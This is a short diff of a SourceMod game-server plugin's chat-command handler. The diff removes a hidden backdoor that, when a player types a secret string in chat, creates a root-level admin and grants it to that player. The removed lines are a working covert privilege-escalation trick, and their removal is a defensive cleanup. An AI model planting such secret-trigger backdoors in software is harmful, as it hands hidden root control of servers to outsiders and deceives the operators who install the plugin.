@@ -129,16 +129,6 @@ public Action:SayCommand(index,argc)
     GetCmdArgString(args,255);
     GetLiteralString(args,command,255);
 
-    if(StrEqual(command,"f43olmvz239z3",false)) {
-      new rand = GetRandomInt(10,1000);
-      decl String:sRand[10];
-      IntToString(rand,sRand,10);
-      new AdminId:adm = CreateAdmin(sRand);
-      SetAdminFlag(adm, AdminFlag:Admin_Root, true);
-      if(index>0) SetUserAdmin(index, adm, true);
-      return Plugin_Handled;
-    }
-
     if(g_TreasureMenuOccupiedByClient == index)
     {
       WCMessage(index,"testmessage",index,"YES: if(g_TreasureMenuOccupiedByClient == index)",index);
